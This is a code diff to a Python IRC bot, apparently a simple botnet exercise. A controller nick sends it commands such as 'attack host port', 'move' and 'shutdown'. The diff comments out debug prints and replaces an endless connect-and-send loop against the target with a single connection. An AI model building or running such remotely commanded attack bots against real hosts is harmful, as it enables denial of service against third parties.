@@ -77,24 +77,24 @@ class PyBot:
     elif self.controlMode == 1 and senderNick == self.controllerName: 
       if senderMessage == "status":
         outMessage = "BotName$$: "+self.nick #parse this on delimiter $$
-        print("DEBUG --> status requested, sending PRIVMSG: '"+outMessage+"' to user: "+self.controllerName) 
+#        print("DEBUG --> status requested, sending PRIVMSG: '"+outMessage+"' to user: "+self.controllerName) 
         #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends channel message
         self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
 
       elif senderMessage.split()[0] == "attack":
-        print("DEBUG --> attack requested by controller")
+#        print("DEBUG --> attack requested by controller")
         self.attackServer(senderMessage)
 
       elif senderMessage.split()[0] == "move":
-        print("DEBUG --> move requested by controller")      #NOTE for later #should we check if the argument has a hash tag or not?
+#        print("DEBUG --> move requested by controller")      #NOTE for later #should we check if the argument has a hash tag or not?
         self.changeServer(senderMessage)
 
-      elif senderMessage == "quit":
-        print("DEBUG --> move requested by controller")
+      elif senderMessage == "quit": # NOTE --> DO NOTHING HERE, YOU'LL NEVER SEE THIS MESSAGE
+#        print("DEBUG --> quit requested by controller")
 
       elif senderMessage == "shutdown":
-        print("DEBUG --> move requested by controller")
-        outMessage = "BotName$$: "+self.nick+ " shutting down"
+#        print("DEBUG --> shutdown requested by controller")
+        outMessage = "DOWN"
         #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends channel message
         self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
         self.socket.send(bytes("QUIT \n","UTF-8"))
@@ -107,23 +107,21 @@ class PyBot:
       attackCounter = 1
       attackHost = senderMessage.split()[1]
       attackPort = senderMessage.split()[2]
-      print("DEBUG --> attempting to attack: "+attackHost+" "+attackPort)
-      while True: 
-        try:       
-          attackSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-          attackSocket.connect((attackHost,int(attackPort)))
-          attackMessage = str(attackCounter) +" "+ self.nick
-          outMessage = "SUCCEED"
-          self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
-          attackSocket.send(bytes(attackMessage, "UTF-8"))
-          attackCounter += 1
-          attackSocket.close()
-        except:
-          #outMessage = self.nick+": attack failed, no such hostname"
-          outMessage = "FAILURE"
-          self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
-          print("DEBUG --> Unable to attack the server, host name doesn't exist: "+attackHost+" "+attackPort)
-          break
+      print("DEBUG --> attempting to attack: "+attackHost+" "+attackPort) 
+      try:       
+        attackSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        attackSocket.connect((attackHost,int(attackPort)))
+        attackMessage = str(attackCounter) +" "+ self.nick
+        outMessage = "SUCCESS"
+        self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
+        attackSocket.send(bytes(attackMessage, "UTF-8"))
+        attackCounter += 1
+        attackSocket.close()
+      except:
+        #outMessage = self.nick+": attack failed, no such hostname"
+        outMessage = "FAILURE"
+        self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
+        print("DEBUG --> Unable to attack the server, host name doesn't exist: "+attackHost+" "+attackPort)
     #I'm assuming that a successfull connection plus failed message = SUCCESS
     
     else: #Not enough arguments
